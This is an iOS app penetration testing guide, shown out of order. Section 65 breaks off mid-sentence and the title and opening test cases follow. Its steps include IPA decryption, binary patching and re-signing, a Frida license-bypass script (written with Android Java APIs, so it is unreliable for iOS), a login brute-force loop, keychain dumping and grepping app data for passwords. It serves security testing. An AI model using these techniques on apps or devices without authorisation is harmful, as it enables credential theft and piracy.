- Validate all deep link parameters
- Require authentication for sensitive actions
- Whitelist allowed actions
- Sanitize URLs before loading
- Don't execute commands from deep links
- Implement confirmation dialogs
- Log deep link usage
- Example secure handling:
```swift
func application(_ app: UIApplication, open url: URL, options: [UIApplication.OpenURLOptionsKey : Any] = [:]) -> Bool {
    guard let scheme = url.scheme, scheme == "myapp" else {
        return false
    }
    
    guard let host = url.host else { return false }
    
    // Whitelist allowed actions
    let allowedActions = ["view", "share"]
    guard allowedActions.contains(host) else {
        return false
    }
    
    // Validate parameters
    if let components = URLComponents(url: url, resolvingAgainstBaseURL: false) {
        // Sanitize and validate queryItems
    }
    
    // Require authentication for sensitive operations
    if requiresAuth(host) && !isAuthenticated() {
        return false
    }
    
    return true
}
```

---

## REVERSE ENGINEERING

### 58. Testing for Lack of Obfuscation

**Issue Description**: Unobfuscated code makes reverse engineering and understanding app logic trivial.

**Execution Steps**:
```bash
# Analyze code obfuscation level:

# 1. Use class-dump
class-dump App > classes.txt

# Check for readable class/method names:
@interface LoginViewController : UIViewController
- (void)validateCredentials:(NSString *)username password:(NSString *)password;
- (void)performLogin;
@end

# 2. Disassemble with Hopper
Open App in Hopper Disassembler
Check for:
- Clear function names
- Readable strings
- Obvious control flow
- Identifiable algorithms

# 3. Analyze strings
strings App | less

# Look for:
- Clear variable names
- Readable error messages
- API endpoints
- Encryption keys
- Algorithm names

# 4. Check symbol table
nm -a App | head -50

# Readable symbols indicate no obfuscation:
0000000100004a20 t _LoginViewController.validatePassword
0000000100004b40 t _APIManager.sendRequest

# 5. Test with Frida
frida-trace -U -f com.example.app -i "Login*"

# If many methods visible → no obfuscation

# 6. Analyze with MobSF
Upload IPA
Check obfuscation score
Review exposed classes/methods

# 7. Check for anti-debugging
otool -l App | grep LC_ENCRYPTION_INFO
# If cryptid = 0, not encrypted
```

**Expected Output**: Code should be obfuscated in production builds.

**Vulnerability Confirmation**:
```
No obfuscation found:

Readable class names:
- LoginViewController
- PaymentManager
- CreditCardValidator
- AdminPanelController

Clear method names:
- validateCreditCard:
- processPayment:amount:
- encryptWithKey:
- validateAdminToken:

Visible strings:
"SELECT * FROM users WHERE username = ?"
"admin_secret_key_12345"
"Encryption algorithm: AES256"

Result: Easy to reverse engineer and exploit
```

**Generic Mitigation**:
- Use code obfuscation tools
- Obfuscate class and method names
- String encryption
- Control flow obfuscation
- Strip debug symbols
- Use ProGuard/R8 equivalent for iOS
- Anti-debugging techniques
- Regular obfuscation testing
- Commercial obfuscation tools:
  - iXGuard
  - Arxan
  - Promon SHIELD

---

### 59. Decrypting IPA File

**Issue Description**: IPA file can be decrypted from device memory to analyze unencrypted binary.

**Execution Steps**:
```bash
# Decrypt IPA from jailbroken device:

# Method 1: Using frida-ios-dump
# Setup
pip install frida-tools
git clone https://github.com/AloneMonkey/frida-ios-dump
cd frida-ios-dump
pip install -r requirements.txt

# Configure
Edit dump.py with device credentials

# Decrypt
python dump.py -l  # List apps
python dump.py "App Name"
# Decrypted IPA saved to current directory

# Method 2: Using Clutch
# Install Clutch on jailbroken device
ssh root@device-ip
Clutch -i  # List apps
Clutch -d com.example.app
# Decrypted IPA in /private/var/tmp/clutch/

# Method 3: Using bagbak
npm install -g bagbak
bagbak com.example.app

# Method 4: Manual dumping with LLDB
debugserver *:1234 -a "App"
# On computer:
lldb
process connect connect://device-ip:1234
dump memory app.bin 0x100000000 0x100010000

# Verify decryption:
otool -l decrypted.ipa | grep cryptid
# cryptid 0 = decrypted successfully
# cryptid 1 = still encrypted

# Compare sizes:
ls -lh original.ipa decrypted.ipa
# Decrypted should be larger
```

**Expected Output**: App should detect decryption attempts or implement additional protections.

**Vulnerability Confirmation**:
```
Decryption successful:

Original IPA: Encrypted (cryptid=1)
Decrypted IPA: Unencrypted (cryptid=0)

Analysis now possible:
- Full reverse engineering
- Code analysis
- Asset extraction
- Algorithm recovery
- Secrets extraction

No anti-tampering detected
```

**Generic Mitigation**:
- While FairPlay DRM can be bypassed on jailbroken devices, implement:
- Runtime integrity checks
- Anti-debugging protections
- Jailbreak detection
- Code obfuscation
- Critical logic on server-side
- Checksum verification
- Binary signing validation
- Monitor for modified binaries

---

### 60. Application Build Contains Obsolete Files

**Issue Description**: Development files, debugging symbols, or obsolete code in production builds expose information.

**Execution Steps**:
```bash
# Analyze IPA contents:

# 1. Extract IPA
unzip app.ipa -d extracted

# 2. List all files
find extracted -type f

# Look for:
- .DS_Store files
- Debug symbols (.dSYM)
- Source maps
- Development certificates
- Test files
- Backup files
- Log files

# 3. Check for debug symbols
cd extracted/Payload/App.app
ls -la | grep -E '.dSYM|.plist|.txt|.log'

# 4. Search for development files
find . -name "*.orig"
find . -name "*.bak"
find . -name "*test*"
find . -name "*debug*"

# 5. Check for source code
find . -name "*.swift"
find . -name "*.m"
find . -name "*.h"

# 6. Look for configuration files
find . -name "*.json"
find . -name "*.xml"
find . -name "*.config"

# 7. Check for credentials in files
grep -r "password" .
grep -r "api_key" .
grep -r "secret" .

# Using MobSF:
Upload IPA
Check "Files" section
Review unnecessary files
```

**Expected Output**: Clean production build without development artifacts.

**Vulnerability Confirmation**:
```
Obsolete files found:

Development files:
- test_credentials.txt
- debug_settings.plist
- developer_notes.txt

Debug information:
- App.dSYM/
- debug.log

Source code:
- ViewController.swift.orig
- backup/old_code.m

Configuration:
- dev_config.json
- staging_api_keys.txt

Sensitive data:
test_credentials.txt contains:
username: admin
password: Admin@123
```

**Generic Mitigation**:
- Clean builds for production
- Remove debug symbols (strip)
- Delete development files
- Use .gitignore properly
- Automate build cleanup
- Build script validation
- Use different build configurations
- Example: build script
```bash
# Production build cleanup
rm -rf *.dSYM
find . -name "*.orig" -delete
find . -name "*test*" -delete
find . -name "*.log" -delete
strip App  # Remove symbols
```

---

### 61. Unauthorized Code Modification

**Issue Description**: App binary can be modified and re-signed without detection.

**Execution Steps**:
```bash
# Test anti-tampering:

# 1. Modify binary
# Extract IPA
unzip app.ipa
cd Payload/App.app

# Modify binary with Hopper
# Change logic, bypass checks

# 2. Re-sign application
# Create provisioning profile
# Re-sign:
codesign -f -s "iPhone Developer" App
codesign -f -s "iPhone Developer" --entitlements entitlements.plist App

# 3. Repackage IPA
cd ../..
zip -r modified.ipa Payload

# 4. Install modified app
ios-deploy --bundle modified.ipa

# 5. Test if modifications work
Launch app
Check if modified code executes

# Using Frida for runtime modification:
frida -U -f com.example.app -l bypass.js

# Frida script to bypass license check:
Java.perform(function() {
    var LicenseCheck = Java.use("com.example.LicenseCheck");
    LicenseCheck.isValid.implementation = function() {
        console.log("License check bypassed");
        return true;
    };
});

# Check for integrity verification:
# Does app detect:
- Modified binary
- Different signature
- Missing/altered files
- Debugger attachment
```

**Expected Output**: App detects tampering and refuses to run.

**Vulnerability Confirmation**:
```
No anti-tampering:
1. Binary modified (license check removed)
2. App re-signed with different certificate
3. Modified app installed successfully
4. App runs normally
5. Premium features unlocked

No detection of:
- Code modification
- Signature change
- Debugger presence
- Runtime hooking

Result: Complete bypass of protections
```

**Generic Mitigation**:
- Implement code integrity checks
- Verify digital signature at runtime
- Checksum validation
- Anti-debugging techniques
- Detect hooking frameworks (Frida, Cycript)
- Server-side validation
- Obfuscate integrity checks
- Example integrity check:
```swift
func verifyIntegrity() -> Bool {
    // Check signature
    guard let path = Bundle.main.executablePath else { return false }
    guard let code = SecCodeCopyPath(path as CFURL, [], nil) else { return false }
    
    // Verify signature
    let status = SecCodeCheckValidity(code, [], nil)
    return status == errSecSuccess
}

// Check for debugger
func isDebuggerAttached() -> Bool {
    var info = kinfo_proc()
    var mib: [Int32] = [CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid()]
    var size = MemoryLayout<kinfo_proc>.stride
    sysctl(&mib, 4, &info, &size, nil, 0)
    return (info.kp_proc.p_flag & P_TRACED) != 0
}
```

---

### 62. Checking for IPA Signing and Deploying in iOS

**Issue Description**: Improper code signing allows installation of modified or malicious apps.

**Execution Steps**:
```bash
# Verify code signing:

# 1. Check signature
codesign -vv -d Payload/App.app/App

# Output shows:
Identifier=com.example.app
Authority=iPhone Developer: Name (XXXXXXXXXX)
Authority=Apple Worldwide Developer Relations Certification Authority
Authority=Apple Root CA
Signed Time=...
Info.plist entries=...

# 2. Verify entitlements
codesign -d --entitlements :- Payload/App.app/App

# 3. Check provisioning profile
security cms -D -i Payload/App.app/embedded.mobileprovision

# Look for:
- Application Identifier
- Team Identifier
- Provisioning Profile Name
- Expiration Date
- Entitled devices

# 4. Verify all components signed
find Payload/App.app -type f -exec codesign -v {} \;

# 5. Check for ad-hoc signing
codesign -dv Payload/App.app
# If shows "Signature=adhoc" → Development only

# 6. Test re-signing with different certificate
# Remove signature
codesign --remove-signature Payload/App.app

# Sign with different cert
codesign -f -s "Different Certificate" Payload/App.app

# Check if app still works
# Does it validate certificate?

# 7. Enterprise certificate abuse
# Check if enterprise cert used for public distribution
security cms -D -i embedded.mobileprovision | grep -i enterprise
```

**Expected Output**: Proper signing with valid certificates, signature validation enforced.

**Vulnerability Confirmation**:
```
Signing issues found:

1. Ad-hoc signature (development)
2. Expired provisioning profile
3. Enterprise cert for public app
4. App runs with any signature
5. No certificate pinning
6. Modified app installs

Risks:
- Malicious app distribution
- Code injection
- Man-in-the-middle
- App impersonation
```

**Generic Mitigation**:
- Use proper AppStore distribution certificates
- Validate signatures at runtime
- Certificate pinning
- Check provisioning profile validity
- Enterprise certs only for internal use
- Regular certificate rotation
- Monitor certificate usage
- Implement app attestation

---

## FILE SYSTEM ANALYSIS

### 63. Check UUID of Sandbox Location

**Issue Description**: Understanding sandbox structure helps identify where sensitive data is stored.

**Execution Steps**:
```bash
# On jailbroken device:

# 1. Find app UUID/container
ssh root@device-ip
ps aux | grep "App Name"
# Note the UUID in path

# 2. Navigate to sandbox
cd /var/mobile/Containers/Data/Application/[UUID]

# Structure:
/var/mobile/Containers/Data/Application/[UUID]/
├── Documents/
├── Library/
│   ├── Caches/
│   ├── Preferences/
│   └── Application Support/
└── tmp/

# 3. List sandbox contents
ls -laR

# 4. Check permissions
ls -l Documents/
ls -l Library/

# 5. Find sensitive data locations
find . -name "*.db"
find . -name "*.plist"
find . -name "*.sqlite"

# 6. Check data protection
ls -lO Documents/
# Look for protection class flags

# Using ideviceinstaller:
ideviceinstaller -l
# Shows bundle IDs

# Using libimobiledevice:
ideviceimagemounter
ideviceinfo

# Check app container
idevice_id -l
```

**Expected Output**: Proper understanding of sandbox structure for security testing.

**Vulnerability Confirmation**:
```
Sandbox analysis findings:

UUID: A1B2C3D4-E5F6-G7H8-I9J0-K1L2M3N4O5P6

Sensitive files found:
/Documents/userdata.db (No protection)
/Library/Preferences/com.example.app.plist (Readable)
/Library/Caches/API_responses/ (Sensitive data cached)
/tmp/session_tokens.txt (Temporary but sensitive)

Issues:
- Sensitive data without encryption
- No data protection classes
- Readable by other processes (if jailbroken)
```

**Generic Mitigation**:
- Use appropriate directories:
  - Documents/ - User data (backed up)
  - Library/Application Support/ - App data
  - Library/Caches/ - Temporary (not backed up)
  - tmp/ - Very temporary
- Implement data protection
- Encrypt sensitive files
- Proper file permissions
- Don't store sensitive data unnecessarily

---

### 64. Check UUID of Application Data

**Issue Description**: Verifying how application data is stored and protected in the sandbox.

**Execution Steps**:
```bash
# Analyze application data:

# 1. Access app container
ssh root@device-ip
cd /var/mobile/Containers/Data/Application/[UUID]

# 2. Check Documents directory
ls -lO Documents/
# Look for user-generated content

# 3. Check Library directory
cd Library
ls -la
# Preferences/
# Caches/
# Application Support/

# 4. Examine databases
find . -name "*.db" -o -name "*.sqlite"
sqlite3 database.db
.tables
SELECT * FROM sensitive_table;

# 5. Check plist files
find . -name "*.plist"
plutil -p Settings.plist

# 6. Check for cached credentials
grep -r "password" .
grep -r "token" .
grep -r "session" .

# 7. Check file protection
ls -lO database.db
# Protection class should be shown

# 8. Analyze with iExplorer or iFunBox
# Connect device
# Browse to application container
# Examine file structure

# Check encryption
file Documents/sensitive.dat
# Should show encrypted data

# Using Objection:
objection -g com.example.app explore
ios nsuserdefaults get
ios cookies get
ios keychain dump
```

**Expected Output**: Sensitive data encrypted with proper protection classes.

**Vulnerability Confirmation**:
```
Insecure data storage:

Found in Documents/:
- user_credentials.txt (plaintext)
- session_tokens.json (unencrypted)

Found in Library/Preferences/:
- settings.plist contains API keys

Found in Caches/:
- api_responses/ with user data
- images/ with sensitive documents

Protection class: None

Issues:
- Plaintext sensitive data
- No file-level encryption
- Backup includes sensitive data
- Accessible on jailbroken devices
```

**Generic Mitigation**:
- Encrypt sensitive files
- Use Data Protection API
- Implement proper protection classes
- Use Keychain for credentials
- Don't cache sensitive data
- Clear caches appropriately
- Example:
```swift
// Write with protection
let data = sensitiveData.data(using: .utf8)!
try data.write(to: fileURL, options: [.completeFileProtection])

// Or NSFileProtectionComplete
let attributes = [FileAttributeKey.protectionKey: FileProtectionType.complete]
try FileManager.default.setAttributes(attributes, ofItemAtPath: path)
```

---

### 65. Check IPA Package

**Issue Description**: Analyzing IPA package structure for security issues and sensitive information.

**Execution Steps**:
```bash
# Extract and analyze IPA:

# 1. Rename and extract
cp app.ipa app.zip
unzip app.zip -d extracted

# 2. Navigate to payload
cd extracted/Payload/App.app

# 3. Check package contents
ls -la

# Common files:
- App (main binary)
- Info.plist
- embedded.mobileprovision
- Assets.car (images)
- Frameworks/ (embedded frameworks)
- PlugIns/ (app extensions)

# 4. Analyze Info.plist
plutil -p Info.plist

# Check for:
- Bundle Identifier
- Version information
- URL schemes
- Permissions (Usage Descriptions)
- App Transport Security settings
- Background modes

# 5. Check for sensitive files
find . -name "*.txt"
find . -name "*.json"
find . -name "*.xml"
find . -name "*.plist"

# 6. Extract and analyze assets
# Install cartool or use Asset Catalog Tinkerer
cartool Assets.car output/

# 7. Check for hardcoded data
strings App | grep -i "api\|key\|password\|secret"

# 8. Analyze frameworks
cd Frameworks
for framework in *.framework; do
    echo "Analyzing $framework"
    strings "$framework/$(basename $framework .framework)" | head -20
done

# 9. Check code signing
codesign -dv --verbose=4 ../App

# 10. Check for third-party SDKs
class-dump ../App | grep -i "SDK\|Framework"

# Using MobSF:
# Upload IPA
# Review all sections:
- App Info
- Security Analysis
- Components
- Files
```

**Expected Output**: Clean package without sensitive information or vulnerabilities.

**Vulnerability Confirmation**:
```
IPA analysis findings:

Sensitive files found:
- config.json (API endpoints, keys)
- test_data.txt (test credentials)
- staging.plist (staging server# iOS Penetration Testing Complete Guide

## Table of Contents
1. [Introduction to iOS Security](#introduction)
2. [Tools and Setup](#tools-setup)
3. [Test Environment Configuration](#configuration)
4. [Test Case Categories Overview](#categories)
5. [Detailed Test Cases](#detailed-tests)

---

## 1. Introduction to iOS Security {#introduction}

iOS applications run in a sandboxed environment with multiple security layers including:
- **App Sandbox**: Restricts file system access
- **Code Signing**: Ensures app integrity
- **Data Protection API**: Hardware-level encryption
- **Keychain Services**: Secure credential storage
- **Address Space Layout Randomization (ASLR)**: Memory protection

---

## 2. Tools and Setup {#tools-setup}

### Essential Tools

#### Static Analysis Tools
- **Hopper Disassembler**: Binary analysis and disassembly
- **IDA Pro**: Advanced reverse engineering
- **class-dump**: Extract class information from Mach-O files
- **Clutch/frida-ios-dump**: Decrypt IPA files
- **MobSF (Mobile Security Framework)**: Automated security analysis
- **iRET (iOS Reverse Engineering Toolkit)**: Collection of tools for iOS testing

#### Dynamic Analysis Tools
- **Frida**: Dynamic instrumentation framework
- **Objection**: Runtime mobile exploration powered by Frida
- **Cycript**: Explore and modify iOS apps at runtime
- **Burp Suite**: Intercept and modify HTTP/HTTPS traffic
- **Wireshark**: Network traffic analysis
- **tcpdump**: Command-line packet analyzer

#### Device Tools
- **Checkra1n/unc0ver**: Jailbreak tools
- **SSH/OpenSSH**: Remote device access
- **iFunBox/iMazing**: File system browsing
- **Xcode**: Development and debugging tools
- **libimobiledevice**: Cross-platform protocol library

#### Proxy Tools
- **Charles Proxy**: SSL proxy for debugging
- **Proxyman**: Native macOS proxy tool
- **mitmproxy**: Command-line proxy tool

---

## 3. Test Environment Configuration {#configuration}

### Step 1: Jailbreak iOS Device
```bash
# Download checkra1n or unc0ver
# Compatible devices: iPhone 5s to iPhone X (checkra1n)
# Install via computer or sideloading
```

### Step 2: Install Cydia and Essential Packages
```bash
# Open Cydia after jailbreak
# Add repositories:
# - https://build.frida.re
# - https://cydia.akemi.ai

# Install packages:
- OpenSSH
- Cycript
- PreferenceLoader
- AppSync Unified
- Frida
- SSL Kill Switch 2
```

### Step 3: Setup SSH Access
```bash
# Default credentials
# User: root, Password: alpine (CHANGE THIS!)
ssh root@<device-ip>
passwd  # Change root password
passwd mobile  # Change mobile user password
```

### Step 4: Install Frida on Desktop
```bash
pip install frida-tools
frida-ps -Uai  # List installed apps on device
```

### Step 5: Setup Proxy (Burp Suite)
```
1. Configure Burp Suite listener on 8080
2. On iOS: Settings > Wi-Fi > [Network] > Configure Proxy
3. Enter computer IP and port 8080
4. Install Burp CA Certificate (http://burp)
5. Trust certificate: Settings > General > About > Certificate Trust Settings
```

### Step 6: Obtain IPA File
```bash
# Method 1: Using Frida
frida-ios-dump -l  # List apps
frida-ios-dump -o output.ipa [App Name]

# Method 2: Using iTunes backup
iMazing > Apps > Manage Apps > Extract App

# Method 3: From device
scp root@<device-ip>:/var/containers/Bundle/Application/[UUID]/App.app ~/Desktop/
```

### Step 7: Extract and Analyze IPA
```bash
# Rename .ipa to .zip and extract
unzip app.ipa -d app_folder
cd app_folder/Payload/App.app

# View Info.plist
plutil -p Info.plist

# Extract classes
class-dump App > classes.txt
```

---

## 4. Test Case Categories Overview {#categories}

### Category 1: Enumeration
Information gathering about the application, server, and API configurations without exploitation.

### Category 2: Rate Limiting
Testing for brute force protection and request throttling mechanisms.

### Category 3: Authentication
Testing login mechanisms, token handling, and authentication bypass techniques.

### Category 4: Session Management
Validating session security, token expiration, and session hijacking vulnerabilities.

### Category 5: Access Control
Testing authorization flaws, privilege escalation, and direct object references.

### Category 6: Input Validation
Testing for injection vulnerabilities and input sanitization issues.

### Category 7: File Uploads
Testing file upload functionality for malicious file execution.

### Category 8: Injection
SQL, command, and code injection vulnerabilities.

### Category 9: Error Handling
Testing for information disclosure through error messages.

### Category 10: Business Logic Bypass
Testing payment flows, license checks, and business rule enforcement.

### Category 11: Web Server Configuration
Testing server-side security configurations and flags.

### Category 12: Code Quality
Testing iOS-specific security implementations.

### Category 13: Code Review
Static analysis for hardcoded secrets and sensitive data.

### Category 14: Reverse Engineering
Binary analysis and anti-tampering mechanism testing.

### Category 15: File System Analysis
Testing iOS file system security and data protection.

### Category 16: Insecure Data Storage
Testing for sensitive data stored without proper encryption.

### Category 17: Security Misconfiguration
Testing for iOS-specific misconfigurations.

### Category 18: Application Logs
Testing for sensitive data in logs.

### Category 19: Cryptography
Testing encryption implementation and SSL/TLS security.

---

## 5. Detailed Test Cases {#detailed-tests}

## ENUMERATION

### 1. Checking for Server Information in Headers

**Issue Description**: Server headers may reveal version information, technology stack, and server software details that attackers can use to identify known vulnerabilities.

**Execution Steps**:
```bash
# Using Burp Suite
1. Configure iOS device to proxy through Burp
2. Launch the application
3. Navigate through different features
4. Inspect HTTP responses in Burp Suite > HTTP History
5. Look for headers: Server, X-Powered-By, X-AspNet-Version

# Using curl (if API endpoints known)
curl -I https://api.example.com/endpoint
```

**Expected Output**: Headers should be minimal without version information.

**Vulnerability Confirmation**:
```
Bad Example:
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/7.2.24

Good Example:
Server: nginx
```

**Generic Mitigation**:
- Remove or obfuscate server version headers
- Configure web server to suppress detailed headers
- Use reverse proxy to strip unnecessary headers

---

### 2. Checking for Request and Response Headers

**Issue Description**: Security headers protect against common attacks. Missing security headers expose the application to XSS, clickjacking, and other attacks.

**Execution Steps**:
```bash
# Capture traffic in Burp Suite
# Check for presence of security headers:
1. Intercept requests/responses
2. Look for headers in Response:
   - X-Frame-Options
   - X-Content-Type-Options
   - Content-Security-Policy
   - Strict-Transport-Security
   - X-XSS-Protection
```

**Expected Output**: Security headers should be present with appropriate values.

**Vulnerability Confirmation**:
```
Missing: X-Frame-Options, CSP
Present but weak: X-XSS-Protection: 0
```

**Generic Mitigation**:
```
Implement security headers:
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Content-Security-Policy: default-src 'self'
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

---

### 3. Checking Allowed HTTP Methods

**Issue Description**: Unnecessary HTTP methods (PUT, DELETE, TRACE, OPTIONS) may be enabled, potentially allowing unintended operations.

**Execution Steps**:
```bash
# Using curl
curl -X OPTIONS https://api.example.com/endpoint -v

# Using Burp Suite
1. Send request to Repeater
2. Change method to OPTIONS
3. Check Allow header in response
4. Test each method: PUT, DELETE, TRACE, PATCH
```

**Expected Output**: Only necessary methods (GET, POST) should be allowed.

**Vulnerability Confirmation**:
```
Response shows:
Allow: GET, POST, PUT, DELETE, OPTIONS, TRACE

If TRACE is enabled: Potential XST attack
If PUT/DELETE enabled: Unauthorized modifications possible
```

**Generic Mitigation**:
- Disable unnecessary HTTP methods
- Configure web server to only allow required methods
- Implement proper authorization for all methods

---

### 4. Checking for Request Body Pattern

**Issue Description**: Analyzing request body structure to understand data format, encryption, encoding, and potential attack vectors.

**Execution Steps**:
```bash
# In Burp Suite
1. Capture POST/PUT requests
2. Analyze Content-Type header
3. Examine request body format:
   - JSON
   - XML
   - Base64 encoded
   - Custom serialization
4. Check for patterns in parameter names
5. Look for encrypted/obfuscated data
```

**Expected Output**: Document the request structure and identify sensitive parameters.

**Vulnerability Confirmation**:
```
Issues found:
- Sensitive data in plaintext
- Predictable parameter names
- Missing encryption
- Client-side validation only
```

**Generic Mitigation**:
- Encrypt sensitive data in transit
- Use HTTPS for all communications
- Implement server-side validation
- Avoid exposing internal logic in parameters

---

### 5. Checking Cookie for Authentication/Authorization

**Issue Description**: Insecure cookie attributes can lead to session hijacking, XSS, and CSRF attacks.

**Execution Steps**:
```bash
# In Burp Suite
1. Capture login request/response
2. Inspect Set-Cookie headers
3. Check for flags:
   - Secure flag
   - HttpOnly flag
   - SameSite attribute
   - Domain scope
   - Path scope
   - Expiration

# Using browser dev tools or Charles Proxy
Check cookie attributes in storage
```

**Expected Output**: Cookies should have Secure, HttpOnly, and SameSite flags.

**Vulnerability Confirmation**:
```
Bad Example:
Set-Cookie: sessionid=abc123; Path=/

Good Example:
Set-Cookie: sessionid=abc123; Path=/; Secure; HttpOnly; SameSite=Strict
```

**Generic Mitigation**:
- Set Secure flag for HTTPS-only transmission
- Set HttpOnly to prevent JavaScript access
- Use SameSite=Strict or Lax
- Set appropriate expiration times
- Use random, unpredictable session IDs

---

### 6. Checking for CORS

**Issue Description**: Misconfigured CORS policies allow unauthorized domains to access API resources, potentially exposing sensitive data.

**Execution Steps**:
```bash
# Using curl
curl -H "Origin: https://evil.com" \
     -H "Access-Control-Request-Method: GET" \
     -X OPTIONS https://api.example.com/endpoint -v

# Using Burp Suite
1. Send request to Repeater
2. Add header: Origin: https://malicious.com
3. Check response for:
   - Access-Control-Allow-Origin
   - Access-Control-Allow-Credentials
```

**Expected Output**: CORS should only allow trusted origins.

**Vulnerability Confirmation**:
```
Vulnerable:
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true

This allows any domain to make authenticated requests
```

**Generic Mitigation**:
- Whitelist specific trusted origins
- Never use wildcard (*) with credentials
- Validate Origin header server-side
- Implement proper authentication

---

### 7. Checking for CORS Implemented Headers

**Issue Description**: Verifying which CORS headers are implemented and their configurations.

**Execution Steps**:
```bash
# Check all CORS headers
curl -H "Origin: https://trusted.com" https://api.example.com/endpoint -v

# Look for:
Access-Control-Allow-Origin
Access-Control-Allow-Methods
Access-Control-Allow-Headers
Access-Control-Allow-Credentials
Access-Control-Max-Age
Access-Control-Expose-Headers
```

**Expected Output**: Restrictive CORS policy with specific origins and methods.

**Vulnerability Confirmation**:
- Overly permissive methods allowed
- Sensitive headers exposed
- Long max-age values
- Credentials allowed with wildcard origin

**Generic Mitigation**:
- Specify exact allowed origins
- Limit allowed methods to necessary ones
- Restrict exposed headers
- Set reasonable max-age values

---

### 8. Checking for Restricted HTTP Methods for a User

**Issue Description**: Different user roles should have access to different HTTP methods based on their privileges.

**Execution Steps**:
```bash
# Test as low-privilege user
1. Login as regular user
2. Capture authentication token
3. Try privileged methods (PUT, DELETE, PATCH)
4. Test on admin-only endpoints

# Using Burp Suite
1. Send request to Repeater
2. Change method from GET to DELETE
3. Check if operation succeeds
```

**Expected Output**: Low-privilege users should receive 403 Forbidden for privileged operations.

**Vulnerability Confirmation**:
```
User with "viewer" role can:
- DELETE /api/users/123 (should be forbidden)
- PUT /api/config (should be forbidden)
```

**Generic Mitigation**:
- Implement role-based access control (RBAC)
- Validate permissions for each HTTP method
- Use middleware to enforce authorization
- Log unauthorized access attempts

---

### 9. Identifying Components with Known Vulnerabilities

**Issue Description**: Applications may use third-party libraries, frameworks, or SDKs with known security vulnerabilities.

**Execution Steps**:
```bash
# Extract IPA and analyze
unzip app.ipa -d app_extracted
cd app_extracted/Payload/App.app

# Check Info.plist for SDK versions
plutil -p Info.plist | grep Version

# List frameworks
ls Frameworks/

# Use class-dump to identify libraries
class-dump App | grep -i "framework\|sdk"

# Analyze with MobSF
python3 manage.py runserver
# Upload IPA to MobSF web interface

# Check dependencies
otool -L App
```

**Expected Output**: List of all third-party components and their versions.

**Vulnerability Confirmation**:
```
# Check against vulnerability databases
- CVE database
- NVD (National Vulnerability Database)
- GitHub Security Advisories
- CocoaPods security advisories

Example vulnerable component:
AFNetworking 3.2.0 (CVE-2019-XXXX)
```

**Generic Mitigation**:
- Keep all dependencies updated
- Monitor security advisories
- Use dependency scanning tools
- Remove unused libraries
- Implement Software Composition Analysis (SCA)

---

## RATE LIMITING

### 10. Checking for Rate Limiting (Authenticated and Non-authenticated)

**Issue Description**: Lack of rate limiting allows brute force attacks, credential stuffing, and denial of service attacks.

**Execution Steps**:
```bash
# Test non-authenticated endpoint (login)
# Using Burp Suite Intruder
1. Capture login request
2. Send to Intruder
3. Set payload positions on password field
4. Configure payload: Numbers 1-1000
5. Start attack
6. Monitor response codes and timing

# Test authenticated endpoint
1. Login and capture auth token
2. Select an API endpoint
3. Send to Intruder
4. Send 100+ requests rapidly
5. Check if requests are blocked/throttled

# Using Python script
import requests
for i in range(100):
    r = requests.post('https://api.example.com/login',
                      json={'user': 'test', 'pass': i})
    print(f"Attempt {i}: {r.status_code}")
```

**Expected Output**: After threshold (e.g., 5-10 attempts), requests should be blocked with 429 status.

**Vulnerability Confirmation**:
```
No rate limiting:
- All 100 requests return 200/401
- No delay or blocking
- No CAPTCHA triggered

With rate limiting:
- After 5 attempts: 429 Too Many Requests
- Response includes Retry-After header
```

**Generic Mitigation**:
- Implement rate limiting per IP/user
- Return 429 status code with Retry-After header
- Use sliding window or token bucket algorithms
- Implement progressive delays
- Add CAPTCHA after threshold
- Monitor and alert on unusual patterns

---

### 11. Checking for Rate Limiting through HTTP Verb Tampering

**Issue Description**: Rate limiting may only be applied to specific HTTP methods, allowing bypass by changing the verb.

**Execution Steps**:
```bash
# In Burp Suite
1. Identify rate-limited endpoint (e.g., POST /login)
2. Trigger rate limiting with multiple POST requests
3. Change method to GET, PUT, or other verbs
4. Check if rate limiting is bypassed
5. Test with X-HTTP-Method-Override header

# Example tampering
POST /api/login → Rate limited
GET /api/login → Not rate limited?
POST /api/login with X-HTTP-Method-Override: GET → Bypassed?
```

**Expected Output**: Rate limiting should apply regardless of HTTP method.

**Vulnerability Confirmation**:
```
POST /login - Rate limited after 5 attempts
GET /login - Unlimited attempts allowed
DELETE /login - Unlimited attempts allowed
```

**Generic Mitigation**:
- Apply rate limiting to all HTTP methods
- Validate and restrict allowed methods
- Ignore X-HTTP-Method-Override header
- Implement endpoint-based rate limiting

---

### 12. Checking for Implemented Rate Limiting Headers

**Issue Description**: Proper rate limiting should include informative headers to help clients comply with limits.

**Execution Steps**:
```bash
# Make requests and check response headers
curl -I https://api.example.com/endpoint

# Look for headers:
X-RateLimit-Limit: Maximum requests allowed
X-RateLimit-Remaining: Requests remaining
X-RateLimit-Reset: Time when limit resets
Retry-After: Seconds to wait before retry
```

**Expected Output**: Rate limiting headers should be present and accurate.

**Vulnerability Confirmation**:
```
Missing headers indicate:
- No rate limiting implemented
- Poor client communication
- Unable to track usage

Good example:
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 95
X-RateLimit-Reset: 1635789600
```

**Generic Mitigation**:
- Implement standard rate limit headers
- Document rate limits in API documentation
- Return clear error messages
- Provide reset time information

---

## AUTHENTICATION

### 13. Checking for Implemented Authentication Mechanism

**Issue Description**: Understanding the authentication mechanism helps identify potential weaknesses in credential handling and session management.

**Execution Steps**:
```bash
# Analyze authentication flow
1. Capture login request in Burp Suite
2. Identify authentication type:
   - Basic Auth
   - Bearer Token (JWT)
   - OAuth 2.0
   - API Key
   - Certificate-based
   - Biometric (Touch ID/Face ID)

# Check token format
Authorization: Bearer eyJhbGc...
or
Authorization: Basic dXNlcjpwYXNz
or
Cookie: session_id=abc123

# Decode JWT token
echo "eyJhbGc..." | base64 -d

# Check for weak implementations
- Credentials in GET parameters
- Unencrypted transmission
- Weak token generation
```

**Expected Output**: Strong authentication mechanism with proper encryption.

**Vulnerability Confirmation**:
```
Weak implementations:
- Basic Auth over HTTP
- Credentials in URL
- Weak JWT signature (none algorithm)
- Short-lived tokens not refreshed
- No multi-factor authentication
```

**Generic Mitigation**:
- Use OAuth 2.0 or JWT with strong signing
- Implement HTTPS for all authentication
- Use secure token storage (Keychain)
- Implement token refresh mechanism
- Add multi-factor authentication
- Never send credentials in GET requests

---

### 14. Testing for Authorization Token Bearer

